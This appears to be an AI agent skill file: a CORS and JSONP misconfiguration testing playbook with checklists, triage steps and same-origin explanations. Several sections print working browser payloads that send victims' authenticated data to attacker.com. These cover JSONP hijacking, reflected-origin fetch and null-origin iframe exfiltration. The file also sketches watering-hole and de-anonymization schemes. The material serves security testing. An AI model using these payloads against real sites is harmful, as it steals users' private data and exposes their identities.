---
name: cors-cross-origin-misconfiguration
description: >-
  CORS misconfiguration testing playbook. Use when analyzing cross-origin trust, credentialed browser reads, origin reflection, preflight policy bugs, and browser-based access to authenticated APIs.
---

# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors

> **AI LOAD INSTRUCTION**: Use this skill when browsers can access authenticated APIs cross-origin. Focus on reflected origins, credentialed requests, wildcard trust, parser mistakes, and origin allowlist bypasses.


## 1. WHEN TO LOAD THIS SKILL

Load when:

- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers
- A browser-based attack path might read authenticated API responses
- JSON endpoints appear protected from CSRF but are readable cross-origin

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| wildcard with credentials | `Access-Control-Allow-Origin: *` plus credential support or equivalent broken behavior |
| reflected origin | server echoes arbitrary `Origin` |
| weak allowlist | suffix, prefix, substring, regex, or mixed-case matching errors |
| `null` origin | acceptance of sandboxed, file, or serialized origins |
| preflight trust | overbroad methods and headers |
| internal API exposure | admin or tenant data readable cross-origin |

## 3. QUICK TRIAGE

1. Send crafted `Origin` headers and inspect reflection.
2. Test with and without credentials.
3. Probe allowlist bypasses using attacker subdomains and parser edge cases.
4. If readable data is sensitive, chain to account or tenant impact.
5. Keep direct API authorization impact and browser cross-origin impact separate; a cookieless data read does not need CORS to be exploitable.

## 4. RELATED ROUTES

- Session or JSON action abuse: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)
- OAuth token leakage and callback binding: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- API auth context: [jwt oauth token attacks](../jwt-oauth-token-attacks/SKILL.md)

## GENERIC_NOTE_SUFFIX_TRUST_VS_DIRECT_UNAUTH_20260818

- A reflected host under the target's parent suffix is not automatically attacker-controlled. Test an unrelated attacker-controlled origin as the negative control before calling suffix reflection externally exploitable.
- Use at least three reads: no Origin, an unrelated external Origin, and the candidate trusted-suffix Origin. Compare status, body hash, ACAO, and ACAC. For a simple GET, an OPTIONS 404 does not defeat the browser request and is not the deciding signal.
- If the API already returns sensitive data without cookies, classify and report the direct unauthorized read. Do not inflate it as arbitrary-origin CORS theft unless an attacker-controlled origin is also allowed and credential-bearing browser impact is demonstrated.
- Conversely, suffix reflection can matter when attacker-controlled content exists on a sibling subdomain, a subdomain takeover is proven, or the trusted origin uses insecure protocol/content injection. Record that chain explicitly instead of inferring it.

## Extended cases merged from SCENARIOS.md

## 1. JSONP Hijacking — Complete Attack Scenario


### Mechanism

JSONP (JSON with Padding) wraps JSON data in a function call, enabling cross-origin data access via `<script>` tags. If the JSONP endpoint returns sensitive data and doesn't validate the Referer/Origin:

```html
<!-- Attacker's page: -->
<script>
function stolen(data) {
    // data contains victim's sensitive information
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<script src="https://target.com/api/userinfo?callback=stolen"></script>
<!-- Victim's browser sends cookies → authenticated request → JSONP returns stolen({"name":"victim","email":"..."}) -->
```

### Watering Hole Attack via JSONP

```text
1. Attacker compromises or creates a popular website (watering hole)
2. Embeds JSONP requests to target sites:
   <script src="https://social-site.com/api/profile?callback=exfil"></script>
   <script src="https://bank-site.com/api/account?callback=exfil"></script>
3. When victim visits the watering hole:
   → Browser sends authenticated requests to social-site and bank-site
   → JSONP responses contain victim's data
   → exfil() function sends data to attacker
```

### Honeypot De-Anonymization via JSONP

Security teams use JSONP to identify anonymous visitors:

```html
<!-- Honeypot page includes JSONP from social platforms: -->
<script src="https://weibo.com/api/user?callback=identify"></script>
<script src="https://github.com/api/user?callback=identify"></script>
<!-- If visitor is logged in → JSONP returns their profile → de-anonymized -->
```

---

## 2. Same-Origin Policy — Deep Dive


### Definition

Two URLs have the same origin if and only if protocol, hostname, and port all match:

| URL A | URL B | Same Origin? | Reason |
|---|---|---|---|
| `http://a.com/p1` | `http://a.com/p2` | YES | Same protocol, host, port |
| `http://a.com` | `https://a.com` | NO | Different protocol |
| `http://a.com` | `http://b.com` | NO | Different hostname |
| `http://a.com` | `http://a.com:8080` | NO | Different port |
| `http://a.com` | `http://sub.a.com` | NO | Different hostname |

### document.domain Relaxation

Both pages can set `document.domain = "a.com"` to enable cross-subdomain communication:

```javascript
// On sub1.a.com:
document.domain = "a.com";
// On sub2.a.com:
document.domain = "a.com";
// Now they can access each other's DOM
```

**Security risk**: if any subdomain has XSS, it can set `document.domain` and access all other subdomains that do the same.

---

## 3. CORS vs JSONP — Technical Comparison


| Aspect | JSONP | CORS |
|---|---|---|
| Mechanism | `<script>` tag, callback function | `Access-Control-Allow-Origin` header |
| HTTP methods | GET only | Any method (with preflight for non-simple) |
| Data format | Wrapped in function call | Native JSON/XML/etc. |
| Error handling | No (script either loads or fails) | Yes (fetch API catches errors) |
| Security control | Referer/callback validation | Origin header + server whitelist |
| Browser support | All (legacy) | Modern (IE10+) |
| Credential handling | Always sends cookies | Only with `credentials: include` + server allow |

**Migration path**: replace JSONP endpoints with proper CORS configuration.

---

## 4. CORS Exploitation Payloads


### Read Authenticated Data (reflected origin)

```javascript
// If server reflects any Origin in Access-Control-Allow-Origin:
fetch('https://target.com/api/sensitive-data', {
    credentials: 'include'  // sends cookies
})
.then(r => r.json())
.then(data => {
    // Exfiltrate:
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### Null Origin Exploit (sandbox)

```html
<!-- Create null origin via sandboxed iframe: -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/data', {credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://attacker.com/c?d='+btoa(d)));
</script>
"></iframe>
<!-- Origin header sent as: null -->
<!-- If server allows Access-Control-Allow-Origin: null → exploitable -->
```

---

## 5. Dual-Site Attack Lab Pattern


Testing JSONP hijacking or CORS with two local servers:

```text
Server A (target): localhost:8981 — login page, authenticated API with JSONP
Server B (attacker): localhost:8982 — hosts attack page with JSONP/CORS exploit

Attack flow:
1. Victim logs into Server A (gets session cookie)
2. Victim visits Server B (attacker page)
3. Server B's page includes <script src="http://localhost:8981/api/userinfo?callback=steal">
4. Browser sends Server A's cookies → authenticated JSONP response
5. steal() function on Server B captures the data

Note: for non-localhost testing, change the attack page's target URLs accordingly.
```
